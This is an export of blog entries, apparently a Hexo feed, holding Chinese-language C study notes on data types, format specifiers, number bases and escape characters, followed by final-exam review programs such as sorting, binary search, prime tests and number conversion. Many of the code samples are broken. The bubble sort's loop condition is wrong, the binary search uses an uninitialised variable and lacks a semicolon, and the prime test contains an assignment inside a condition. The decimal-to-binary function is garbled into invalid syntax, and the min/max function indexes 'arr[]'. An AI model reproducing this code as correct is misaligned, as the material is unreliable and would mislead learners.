        <content type="html"><![CDATA[<h1 id="c语言"><a href="#c语言" class="headerlink" title="c语言"></a>c语言</h1><h2 id="变量和数据类型"><a href="#变量和数据类型" class="headerlink" title="变量和数据类型"></a>变量和数据类型</h2><h3 id="数据类型（data-type"><a href="#数据类型（data-type" class="headerlink" title="数据类型（data type)"></a>数据类型（data type)</h3><p>数据是放在内存中的，变量是 给这块内存起的名字，有了变量就嫩找到并使用这份数据。</p><p>字符型 char 1</p><p>短整型 short 2</p><p>整型 int 4</p><p>长整型 long  4</p><p>单精度浮点型 float 4</p><p>双精度浮点型 double 8</p><p>无类型 void</p><p>(最基本的数据类型,数字为数据的长度)</p><p>数据类型只在定义变量时指明，而且必须指明；使用变量时无需再指明，因为此时的数据类型已经确定了。</p><h3 id="数据的输出"><a href="#数据的输出" class="headerlink" title="数据的输出"></a>数据的输出</h3><p>我们可以使用puts来输出字符串，puts只能用来输出字符串。</p><p>而printf可以输出许多类型的数据.</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,a);</span><br></pre></td></tr></table></figure><p>其中%d叫做格式控制符,格式控制符均以%开头，后面跟其他的字符</p><p>%d 十进制</p><p>%c 字符</p><p>%s 字符串</p><p>%f小数</p><p>puts函数将较长的字符串可以分割成几个短的字符串</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;s&quot;</span> <span class="string">&quot;s&quot;</span> <span class="string">&quot;s&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="C语言当中的整数"><a href="#C语言当中的整数" class="headerlink" title="C语言当中的整数"></a>C语言当中的整数</h3><p>int 一般占用四个字节，共计32bit，其数字非常大。</p><p>可以用short long让其内存占用更少或者更多。</p><p>占用字节数如下</p><p>2 ≤ short ≤ int ≤ long</p><h3 id="sizeof操作符"><a href="#sizeof操作符" class="headerlink" title="sizeof操作符"></a>sizeof操作符</h3><p>获取某个数据类型的长度可以用sizeof操作符</p><p>sizeof 用来获取某个数据类型或变量所占用的字节数，如果后面跟的是变量名称，那么可以省略<code>( )</code>，如果跟的是数据类型，就必须带上<code>( )</code>。</p><p>%hd用来输出short int</p><p>%d用来输出int </p><p>%ld用来输出long int</p><h3 id="二进制八进制十六进制"><a href="#二进制八进制十六进制" class="headerlink" title="二进制八进制十六进制"></a>二进制八进制十六进制</h3><h4 id="进制的开头"><a href="#进制的开头" class="headerlink" title="进制的开头"></a>进制的开头</h4><p>二进制的开头必须使用0b或者0B</p><p>八进制必须用0开头</p><p>十六进制由0<del>9字母a</del>f（A~F)组成，使用时必须使用0x或者0X开头</p><h4 id="进制的printf"><a href="#进制的printf" class="headerlink" title="进制的printf"></a>进制的printf</h4><p>​               short        int            long</p><p>八进制       %ho        %o           %lo</p><p>十进制          %hd         %d            %ld</p><p>十六进制         %hx           %x             %lx</p><p>大小写表示用大写还是小写来输出十六进制数</p><p>区分不同进制数字的一个简单办法就是，在输出时带上特定的前缀。在格式控制符中加上<code>#</code>即可输出前缀，例如 %#x、%#o、%#lX、%#ho 等。</p><h3 id="c语言中的正负数"><a href="#c语言中的正负数" class="headerlink" title="c语言中的正负数"></a>c语言中的正负数</h3><p>c语言中把内存的最高位作为符号位。在编程语言中计数常常从0开始，0作为第一位。</p><p>不希望设置符号位的时候可以输入unsigned关键字</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">short</span> a = <span class="number">12</span>;</span><br></pre></td></tr></table></figure><p>这样就没有符号位了。</p><p>无符号数的输出</p><p> unsigned short    unsigned int     unsigned long</p><p>八进制%        ho%           o%                  lo</p><p>十进制               %hu      %u                   %lu</p><p>十六进制  %hx 或者 %hX     %x 或者 %X      %lx 或者 %lX</p><h4 id="c语言中的小数"><a href="#c语言中的小数" class="headerlink" title="c语言中的小数"></a>c语言中的小数</h4><ul><li><p>2.1E5 &#x3D; 2.1×105，其中 2.1 是尾数，5 是指数。</p></li><li><p>3.7E-2 &#x3D; 3.7×10-2，其中 3.7 是尾数，-2 是指数。</p></li><li><p>0.5E7 &#x3D; 0.5×107，其中 0.5 是尾数，7 是指数。</p><p>float为单精度 double为双精度</p><p>float占用四个字节 double占用8个字节</p></li><li><p>printf输出小数的格式</p></li><li><p>%f 以十进制形式输出 float 类型；</p></li><li><p>%lf 以十进制形式输出 double 类型；</p></li><li><p>%e 以指数形式输出 float 类型，输出结果中的 e 小写；</p></li><li><p>%E 以指数形式输出 float 类型，输出结果中的 E 大写；</p></li><li><p>%le 以指数形式输出 double 类型，输出结果中的 e 小写；</p></li><li><p>%lE 以指数形式输出 double 类型，输出结果中的 E 大写。</p><p>其中规则%f 和 %lf 默认保留六位小数，不足六位以 0 补齐，超过六位按四舍五入截断。将整数赋值给 float 变量时会变成小数。 以指数形式输出小数时，输出结果为科学计数法；也就是说，尾数部分的取值为：0 ≤ 尾数 &lt; 10。</p><p>小数的默认类型为double</p><p>将整数赋值给小数加0即可，将小说&#x3D;数赋值给整数只能取其整数部分。</p><h4 id="字符"><a href="#字符" class="headerlink" title="字符"></a>字符</h4><p>字符的经常类型为char 长度为1，只能容纳 ASCII 码表中的字符，也就是英文字符。字符类型由单引号<code>&#39; &#39;</code>包围，字符串由双引号<code>&quot; &quot;</code>包围。其中空格也是一个字符，在使用printf输出字符是，char对应的格式控制符为%c</p><p>转义字符串：</p><p>以\或者\x开头，以<code>\</code>开头表示后跟八进制形式的编码值，以<code>\x</code>开头表示后跟十六进制形式的编码值。对于转义字符来说，只能使用八进制或者十六进制。</p><p>转义字符的初衷是用于 ASCII 编码，所以它的取值范围有限：</p><ul><li>八进制形式的转义字符最多后跟三个数字，也即<code>\ddd</code>，最大取值是<code>\177</code>；</li><li>十六进制形式的转义字符最多后跟两个数字，也即<code>\xdd</code>，最大取值是<code>\x7f</code>。</li></ul></li></ul><table><thead><tr><th>转义字符</th><th>意义</th><th>ASCII码值（十进制）</th></tr></thead><tbody><tr><td>\a</td><td>响铃(BEL)</td><td>007</td></tr><tr><td>\b</td><td>退格(BS) ，将当前位置移到前一列</td><td>008</td></tr><tr><td>\f</td><td>换页(FF)，将当前位置移到下页开头</td><td>012</td></tr><tr><td>\n</td><td>换行(LF) ，将当前位置移到下一行开头</td><td>010</td></tr><tr><td>\r</td><td>回车(CR) ，将当前位置移到本行开头</td><td>013</td></tr><tr><td>\t</td><td>水平制表(HT)</td><td>009</td></tr><tr><td>\v</td><td>垂直制表(VT)</td><td>011</td></tr><tr><td>&#39;</td><td>单引号</td><td>039</td></tr><tr><td>&quot;</td><td>双引号</td><td>034</td></tr><tr><td>\</td><td>反斜杠</td><td>092</td></tr></tbody></table><p><code>\n</code>和<code>\t</code>是最常用的两个转义字符：</p><ul><li><p><code>\n</code>用来换行，让文本从下一行的开头输出，前面的章节中已经多次使用；</p></li><li><p><code>\t</code>用来占位，一般相当于四个空格，或者 tab 键的功能。</p><p>强制转换</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(type_name) expression</span><br></pre></td></tr></table></figure><p><code>type_name</code>为新类型名称，<code>expression</code>为表达式</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> C </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言期末复习3</title>
      <link href="/2023/12/25/dayc3/"/>
      <url>/2023/12/25/dayc3/</url>
      
        <content type="html"><![CDATA[<h1 id="某年某月某日"><a href="#某年某月某日" class="headerlink" title="某年某月某日"></a>某年某月某日</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> year,month,day;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;year,&amp;month);</span><br><span class="line">    <span class="keyword">switch</span>(month)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>: <span class="keyword">case</span> <span class="number">3</span>: <span class="keyword">case</span> <span class="number">5</span>: <span class="keyword">case</span> <span class="number">7</span>: <span class="keyword">case</span> <span class="number">8</span>: <span class="keyword">case</span> <span class="number">10</span>: <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">            day=<span class="number">31</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>: <span class="keyword">case</span> <span class="number">6</span>: <span class="keyword">case</span> <span class="number">9</span>: <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">            day=<span class="number">30</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>: day=(year%<span class="number">4</span>==<span class="number">0</span>&amp;&amp;year%<span class="number">100</span>!=<span class="number">0</span>||year%<span class="number">400</span>==<span class="number">0</span>)?<span class="number">29</span>:<span class="number">28</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d年%d月有%d天&quot;</span>,year,month,day);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="判断素数（函数）"><a href="#判断素数（函数）" class="headerlink" title="判断素数（函数）"></a>判断素数（函数）</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">is_prime</span><span class="params">(<span class="type">int</span> a)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i =<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(a&lt;=<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">2</span>;i&lt;=<span class="built_in">sqrt</span>(a);i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a%i==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">sortarr2</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> n)</span>&#123;</span><br><span class="line">    <span class="type">int</span> i,j;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;j&lt;n<span class="number">-1</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;n-i;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(a[j]&lt;a[j<span class="number">-1</span>])&#123;</span><br><span class="line">                <span class="type">int</span> temp;</span><br><span class="line">                temp=a[j<span class="number">-1</span>];</span><br><span class="line">                a[j<span class="number">-1</span>]=a[j];</span><br><span class="line">                a[j]=temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">sortarry1</span><span class="params">(<span class="type">int</span> *a,<span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i,j;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n<span class="number">-1</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (j=i+<span class="number">1</span>;j&lt;n;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(a[i]&gt;a[j])&#123;</span><br><span class="line">                <span class="type">int</span> temp;</span><br><span class="line">                temp=a[i];</span><br><span class="line">                a[i]=a[j];</span><br><span class="line">                a[j]=temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="二分查找"><a href="#二分查找" class="headerlink" title="二分查找"></a>二分查找</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">search</span><span class="params">(<span class="type">int</span>* a,<span class="type">int</span> key,<span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> first;</span><br><span class="line">    <span class="type">int</span> last=n<span class="number">-1</span>;</span><br><span class="line">    <span class="type">int</span> mid=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(first&lt;last)</span><br><span class="line">    &#123;</span><br><span class="line">        mid=(first+last)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(a[mid]&gt;=key)</span><br><span class="line">        &#123;</span><br><span class="line">            last=mid;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">        &#123;</span><br><span class="line">            first=mid+<span class="number">1</span>;</span><br><span class="line">        </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(a[last]==key)&#123;</span><br><span class="line">        <span class="keyword">return</span> mid;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="数组最大值平均数"><a href="#数组最大值平均数" class="headerlink" title="数组最大值平均数"></a>数组最大值平均数</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_N 100</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">float</span> nums[MAX_N];</span><br><span class="line">    <span class="type">int</span> n,i;</span><br><span class="line">    <span class="type">float</span> max,avg;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入数组个数n=&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%f&quot;</span>,&amp;nums[i]);</span><br><span class="line">        avg+=nums[i];</span><br><span class="line">    &#125;   </span><br><span class="line">    max=nums[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++) (max&lt;nums[i])?(max=nums[i]):max;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;max=%.2f,avg=%.2f&quot;</span>,max,avg/n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="素数判断"><a href="#素数判断" class="headerlink" title="素数判断"></a>素数判断</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span> <span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> i,j,isprinme=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">2</span>;i&lt;=<span class="number">100</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (i==<span class="number">2</span>||i==<span class="number">3</span>) isprinme=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (i%<span class="number">6</span>==<span class="number">1</span>&amp;&amp;i%<span class="number">6</span>!=<span class="number">5</span>) isprinme=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">5</span>;j&lt;<span class="built_in">sqrt</span>(i);j+=<span class="number">6</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(i%j=<span class="number">0</span>||i%(j+<span class="number">2</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">                    isprinme=<span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    (isprinme==<span class="number">1</span>)?<span class="built_in">printf</span>(<span class="string">&quot;%d\t&quot;</span>,i):(isprinme=<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="水仙花数"><a href="#水仙花数" class="headerlink" title="水仙花数"></a>水仙花数</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">100</span>;i&lt;<span class="number">1000</span>;i++) (i==<span class="built_in">pow</span>(i/<span class="number">100</span>,<span class="number">3</span>)+<span class="built_in">pow</span>(i%<span class="number">10</span>,<span class="number">3</span>)+<span class="built_in">pow</span>(i/<span class="number">10</span>%<span class="number">10</span>,<span class="number">3</span>))?<span class="built_in">printf</span>(<span class="string">&quot;%d\t&quot;</span>, i):<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="大小写转换"><a href="#大小写转换" class="headerlink" title="大小写转换"></a>大小写转换</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Max_n 100</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> strs[Max_n];</span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入字符串&quot;</span>);</span><br><span class="line">    gets(strs);</span><br><span class="line">    <span class="keyword">while</span>(strs[i]!=<span class="string">&#x27;0&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(strs[i]&gt;=<span class="number">65</span>&amp;&amp;strs[i]&lt;=<span class="number">90</span>) strs[i]+=<span class="number">32</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,strs[i++]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="杨辉三角的输出"><a href="#杨辉三角的输出" class="headerlink" title="杨辉三角的输出"></a>杨辉三角的输出</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">tri</span><span class="params">(<span class="type">int</span> r,<span class="type">int</span> c)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (c==<span class="number">1</span>||c==r)?<span class="number">1</span>:tri(r<span class="number">-1</span>,c<span class="number">-1</span>)+tri(r<span class="number">-1</span>,c);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i,j,n;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入杨辉三角的行数（1~20&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;n<span class="number">-1</span>;j++) <span class="built_in">printf</span>(<span class="string">&quot;%c%c%c&quot;</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>);</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;=i;j++) <span class="built_in">printf</span>(<span class="string">&quot;%-6d&quot;</span>,tri(i,j));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="阶乘数的显示"><a href="#阶乘数的显示" class="headerlink" title="阶乘数的显示"></a>阶乘数的显示</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">kn</span><span class="params">(<span class="type">int</span> n)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (n==<span class="number">0</span>)?<span class="number">1</span>:n*kn(n<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> n,i;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入阶乘数n:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d!=&quot;</span>,n);</span><br><span class="line">    <span class="keyword">for</span>(i=n;i&gt;<span class="number">0</span>;i--) (i!=<span class="number">1</span>)?<span class="built_in">printf</span>(<span class="string">&quot;%d*&quot;</span>,i):<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,i);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;=%d&quot;</span>,kn(n));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="逆序输出数字"><a href="#逆序输出数字" class="headerlink" title="逆序输出数字"></a>逆序输出数字</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="keyword">while</span>(n&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        (n%<span class="number">10</span>!=<span class="number">0</span>)?<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,n%<span class="number">10</span>):<span class="number">0</span>;</span><br><span class="line">        n/=<span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> c </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言期末复习2</title>
      <link href="/2023/12/04/dayc2/"/>
      <url>/2023/12/04/dayc2/</url>
      
        <content type="html"><![CDATA[<h2 id="C语言常见代码汇总"><a href="#C语言常见代码汇总" class="headerlink" title="C语言常见代码汇总"></a>C语言常见代码汇总</h2><h2 id="判断一个年份是闰年"><a href="#判断一个年份是闰年" class="headerlink" title="判断一个年份是闰年"></a>判断一个年份是闰年</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">isleapyear</span><span class="params">(<span class="type">int</span> year)</span>&#123;</span><br><span class="line"><span class="keyword">if</span> ((year%<span class="number">4</span>==<span class="number">0</span>&amp;&amp;year%<span class="number">100</span>!=<span class="number">0</span>)||year%<span class="number">400</span>==<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="计算两个数的最大公约数（欧几里得算法）"><a href="#计算两个数的最大公约数（欧几里得算法）" class="headerlink" title="计算两个数的最大公约数（欧几里得算法）"></a>计算两个数的最大公约数（欧几里得算法）</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">gcd</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span>&#123;</span><br><span class="line"><span class="keyword">if</span> (b==<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> gcd(b,a%b);<span class="comment">//递归计算最大公约数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="二进制数转换为十进制数"><a href="#二进制数转换为十进制数" class="headerlink" title="二进制数转换为十进制数"></a>二进制数转换为十进制数</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">binarytodecimal</span><span class="params">(<span class="type">int</span> binary)</span>&#123;</span><br><span class="line"><span class="keyword">while</span>(binary&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="type">int</span> reminder=binary%<span class="number">10</span>;<span class="comment">//获取最后一位数字</span></span><br><span class="line">decimal+=reminder*base;<span class="comment">//将最后一位数字乘以对应权重加到结果中</span></span><br><span class="line">binary/=<span class="number">10</span>;<span class="comment">//去掉最后一位数字</span></span><br><span class="line">base*=<span class="number">2</span>;<span class="comment">//每次权重乘以2</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> decimal;<span class="comment">//返回对应的十进制数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="斐波那契数列（递归）"><a href="#斐波那契数列（递归）" class="headerlink" title="斐波那契数列（递归）"></a>斐波那契数列（递归）</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">fibonacci</span><span class="params">(<span class="type">int</span> n)</span>&#123;</span><br><span class="line"><span class="keyword">if</span> (n&lt;=<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> n;<span class="comment">//斐波那契数列的前两个数是1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> fibonacci(n<span class="number">-1</span>)+fibonacci(n<span class="number">-2</span>);<span class="comment">//递归调用计算下一个数字</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="将一个十进制转化为二进制"><a href="#将一个十进制转化为二进制" class="headerlink" title="将一个十进制转化为二进制"></a>将一个十进制转化为二进制</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">decimaltobinary</span><span class="params">(<span class="type">int</span> decimal)</span>&#123;</span><br><span class="line"><span class="type">int</span> innary[<span class="number">32</span>],index=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(decimal&gt;<span class="number">0</span>)&#123;</span><br><span class="line">binary[index++]=decimal%<span class="number">2</span></span><br><span class="line">decimal/=<span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i-=index-);i&gt;=;i--)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d</span></span><br><span class="line"><span class="string">,binary[i];</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">printf(&quot;</span>\n<span class="string">&quot;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="求一个数组中的最大值和最小值"><a href="#求一个数组中的最大值和最小值" class="headerlink" title="求一个数组中的最大值和最小值"></a>求一个数组中的最大值和最小值</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">findminmax</span><span class="params">(<span class="type">int</span> arr[],<span class="type">int</span> size)</span>&#123;</span><br><span class="line"><span class="type">int</span> min = arr[<span class="number">0</span>],max = arr[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">1</span>;i&lt;size;i++)&#123;</span><br><span class="line"><span class="keyword">if</span> (arr[]&lt;min)&#123;</span><br><span class="line">min = arr[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (arr[i]&gt;max)&#123;</span><br><span class="line">max=arr[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="实现简单的计算器（-x-）"><a href="#实现简单的计算器（-x-）" class="headerlink" title="实现简单的计算器（+-x&#x2F;）"></a>实现简单的计算器（+-x&#x2F;）</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">add</span> <span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">subtract</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span>&#123;</span><br><span class="line"><span 